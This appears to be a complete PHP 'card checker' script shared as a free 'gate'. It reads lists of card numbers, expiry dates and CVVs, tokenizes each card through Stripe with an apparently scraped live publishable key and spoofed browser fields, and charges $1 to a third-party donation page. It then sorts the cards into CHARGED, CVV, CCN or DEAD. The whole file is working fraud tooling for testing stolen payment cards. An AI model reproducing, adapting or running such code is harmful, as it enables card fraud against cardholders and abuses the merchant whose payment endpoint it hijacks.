<?php

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


$last4 = substr($cc, -4);



function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];

//=======================[4 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=71008&guid=49fb25a6-dd45-4455-abc2-38a950d56454dba9ba&muid=4a212101-edee-4531-9936-f0087b52ac719900b5&sid=807675d1-5add-4ed5-9448-d5f8d22a41eadc6927&payment_user_agent=stripe.js%2Ff0920f3ce%3B+stripe-js-v3%2Ff0920f3ce&time_on_page=54312&key=pk_live_eHjmIv6BpzVPLB8N3JjuCjsl00SrbAiU3w&pasted_fields=number');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result4 = curl_exec($ch);
$id = trim(strip_tags(getStr($result4,'"id": "','"'))); 
//=======================[4 REQ-END]==============================//

//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://artistsspace.org/payment');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://oneclass.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://oneclass.com/signup.en.html';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&amount=%241&stripeToken='.$id.'');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result5 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result5,'<div id="card-errors" role="alert">',' </div>'))); 

if(strpos($result5, "Thank you for your support.")) {
  echo '<br>CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Completed. Charged $1 ✅     [ Stripe $1 ] [ Free Gates By : @fakehecker ]</span><br>';
}
 elseif(strpos($result5,"Invalid source object: must be a dictionary or a non-empty string. See API docs at https://stripe.com/docs'")) {
  echo '<br>CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result: Processing Error.    [ Stripe $1 ] [ Free Gates By : @fakehecker ]</span><br>';
} 
elseif(strpos($result5, "Your card's security code is incorrect." )) {
    echo '<br>CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your cards security code is incorrect. ✅     [ Stripe $1 ] [ Free Gates By : @fakehecker ]</span><br>';
}
elseif(strpos($result5, "Your card has insufficient funds." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card has insufficient funds. ✅     [ Stripe $1 ][ Free Gates By : @fakehecker ]</span><br>';
}
elseif(strpos($result5, "Your card does not support this type of purchase." )) {
    echo '<br>CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card does not supports this type of purchase. ✅     [ Stripe $1 ] [ Free Gates By : @fakehecker ]</span><br>';
}  
elseif (strpos($result5, "Your card's security code is invalid")){
  echo '<br>CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card has insufficient funds. ✅     [ Stripe $1 ] [ Free Gates By : @fakehecker ]</span><br>';
}  
else {
    echo '<br>DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DECLINED ❌ - '.$msg.'     [ Stripe $1 ] [ Free Gates By : @fakehecker ]</span><br>';
}

